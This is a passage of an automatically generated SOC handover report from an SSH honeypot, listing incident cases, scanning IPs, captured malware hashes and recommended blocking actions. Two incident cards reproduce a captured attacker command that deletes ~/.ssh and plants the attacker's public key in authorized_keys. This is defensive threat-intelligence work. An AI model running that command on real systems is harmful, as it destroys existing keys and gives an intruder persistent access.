| `2026-04-26 05:04:56` | `cowrie.command.failed` |
| `2026-04-26 05:04:56` | `cowrie.log.closed` |
| `2026-04-26 05:04:56` | `cowrie.session.params` |
| `2026-04-26 05:04:56` | `cowrie.command.input` |
| `2026-04-26 05:04:56` | `cowrie.session.file_download` |
| `2026-04-26 05:04:56` | `cowrie.log.closed` |
| `2026-04-26 05:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e3c629b1540

| Field | Detail |
|---|---|
| **Source IP** | `154.81.15[.]63` |
| **First Seen** | 2026-04-26 05:04 |
| **Last Seen** | 2026-04-26 05:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 05:04:58` | `cowrie.session.connect` |
| `2026-04-26 05:04:58` | `cowrie.client.version` |
| `2026-04-26 05:04:58` | `cowrie.client.kex` |
| `2026-04-26 05:04:58` | `cowrie.login.success` |
| `2026-04-26 05:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.15[.]63` to AbuseIPDB if not already reported
- [ ] Block `154.81.15[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d34b65d6c224

| Field | Detail |
|---|---|
| **Source IP** | `88.147.30[.]59` |
| **First Seen** | 2026-04-26 05:40 |
| **Last Seen** | 2026-04-26 05:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 05:40:30` | `cowrie.session.connect` |
| `2026-04-26 05:40:30` | `cowrie.client.version` |
| `2026-04-26 05:40:30` | `cowrie.client.kex` |
| `2026-04-26 05:40:30` | `cowrie.login.success` |
| `2026-04-26 05:40:31` | `cowrie.session.params` |
| `2026-04-26 05:40:31` | `cowrie.command.input` |
| `2026-04-26 05:40:31` | `cowrie.command.failed` |
| `2026-04-26 05:40:31` | `cowrie.log.closed` |
| `2026-04-26 05:40:31` | `cowrie.session.params` |
| `2026-04-26 05:40:31` | `cowrie.command.input` |
| `2026-04-26 05:40:31` | `cowrie.session.file_download` |
| `2026-04-26 05:40:31` | `cowrie.log.closed` |
| `2026-04-26 05:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.147.30[.]59` to AbuseIPDB if not already reported
- [ ] Block `88.147.30[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf0b96763a5

| Field | Detail |
|---|---|
| **Source IP** | `88.147.30[.]59` |
| **First Seen** | 2026-04-26 05:40 |
| **Last Seen** | 2026-04-26 05:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 05:40:33` | `cowrie.session.connect` |
| `2026-04-26 05:40:33` | `cowrie.client.version` |
| `2026-04-26 05:40:34` | `cowrie.client.kex` |
| `2026-04-26 05:40:34` | `cowrie.login.success` |
| `2026-04-26 05:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.147.30[.]59` to AbuseIPDB if not already reported
- [ ] Block `88.147.30[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12e8aa4b2b5

| Field | Detail |
|---|---|
| **Source IP** | `88.147.30[.]59` |
| **First Seen** | 2026-04-26 05:51 |
| **Last Seen** | 2026-04-26 05:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 05:51:45` | `cowrie.session.connect` |
| `2026-04-26 05:51:45` | `cowrie.client.version` |
| `2026-04-26 05:51:46` | `cowrie.client.kex` |
| `2026-04-26 05:51:46` | `cowrie.login.success` |
| `2026-04-26 05:51:46` | `cowrie.session.params` |
| `2026-04-26 05:51:46` | `cowrie.command.input` |
| `2026-04-26 05:51:46` | `cowrie.command.failed` |
| `2026-04-26 05:51:47` | `cowrie.log.closed` |
| `2026-04-26 05:51:47` | `cowrie.session.params` |
| `2026-04-26 05:51:47` | `cowrie.command.input` |
| `2026-04-26 05:51:47` | `cowrie.session.file_download` |
| `2026-04-26 05:51:47` | `cowrie.log.closed` |
| `2026-04-26 05:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.147.30[.]59` to AbuseIPDB if not already reported
- [ ] Block `88.147.30[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5596ce6a56ca

| Field | Detail |
|---|---|
| **Source IP** | `88.147.30[.]59` |
| **First Seen** | 2026-04-26 05:51 |
| **Last Seen** | 2026-04-26 05:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 05:51:49` | `cowrie.session.connect` |
| `2026-04-26 05:51:49` | `cowrie.client.version` |
| `2026-04-26 05:51:49` | `cowrie.client.kex` |
| `2026-04-26 05:51:50` | `cowrie.login.success` |
| `2026-04-26 05:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.147.30[.]59` to AbuseIPDB if not already reported
- [ ] Block `88.147.30[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.179.56[.]78` | **27** | 2026-04-26 03:38 | 2026-04-26 04:47 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `154.81.15[.]63` | **27** | 2026-04-26 04:14 | 2026-04-26 05:08 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `58.209.82[.]184` | **27** | 2026-04-26 04:33 | 2026-04-26 04:43 | 46m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.78.198[.]228` | **21** | 2026-04-26 04:11 | 2026-04-26 04:50 | 2m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `195.161.114[.]163` | **14** | 2026-04-26 03:22 | 2026-04-26 03:32 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `201.62.87[.]177` | **9** | 2026-04-26 04:50 | 2026-04-26 04:50 | 8m | 0 | `T1592` | 🟢 LOW |
| `88.147.30[.]59` | **9** | 2026-04-26 05:31 | 2026-04-26 06:08 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `199.45.155[.]73` | **4** | 2026-04-26 04:45 | 2026-04-26 04:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.144.120[.]14` | **3** | 2026-04-26 04:16 | 2026-04-26 04:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `49.64.85[.]138` | **2** | 2026-04-26 05:31 | 2026-04-26 05:35 | 4m | 0 | `T1592` | 🟢 LOW |
| `116.147.40[.]93` | 1 | 2026-04-26 04:33 | 2026-04-26 04:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-04-26 04:16 | 2026-04-26 04:16 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `171.220.244[.]134` | 1 | 2026-04-26 05:32 | 2026-04-26 05:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-04-26 05:17 | 2026-04-26 05:17 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `201.62.87[.]177` | BR | Life Tecnologia Ltda. | **100** ⚠️ | 0 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `154.81.15[.]63` | HK | UCLOUD INFORMATION TECHNOLOGY HK LIMITED | **100** ⚠️ | 10 |
| `49.64.85[.]138` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `172.104.93[.]159` | JP | Linode | **100** ⚠️ | 50 |
| `3.144.120[.]14` | US | Amazon Technologies Inc. | **100** ⚠️ | 11 |
| `88.147.30[.]59` | IT | EOLO S.p.A. | **100** ⚠️ | 50 |
| `195.161.114[.]163` | RU | Avguro Technologies Ltd. Hosting service provider | **100** ⚠️ | 12 |
| `199.45.155[.]73` | HK | Censys, Inc. | **100** ⚠️ | 50 |
| `171.220.244[.]134` | CN | CHINANET Sichuan province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 197 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 97 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 66 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 34 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 32 |

---

## 🔕 False Positive Summary (99 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 12 |
| AbuseIPDB score 5 below threshold 25 | 7 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 76 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 312 cases |
| Tool 34  | Credential Extractor        | ✅ 164 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 99 filtered (31.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 66 priority case(s) shown individually · 14 recon entry/entries in table (10 group(s) consolidating 143 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-26T06:10:21Z_
